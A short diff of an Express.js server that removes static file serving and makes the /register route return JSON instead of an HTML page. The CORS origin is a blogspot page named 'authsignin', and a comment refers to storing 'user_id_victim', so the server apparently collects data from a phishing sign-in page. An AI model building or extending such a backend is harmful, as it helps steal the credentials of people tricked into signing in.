@@ -4,7 +4,6 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 5000;
 const cors = require('cors');
-app.use(express.static(path.join(__dirname, '../public')));
 app.use(cors({
     // Replace with your specific origin
     origin: 'https://authsignin.blogspot.com'
@@ -57,17 +56,7 @@ app.post('/register', async (req, res) => {
 
         // If you need to store user_id_victim and type, add those fields to your schema as well.
         await newUser.save();
-        res.send(`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Signup Form</title>
-</head>
-<body>
-  <h2>Signup Form</h2>
-     
-</body>
-</html>`);
+        res.status(201).json({ message: 'User registered successfully' });
     } catch (error) {
         res.status(500).json({ error: 'Error registering user', details: error.message });
     }
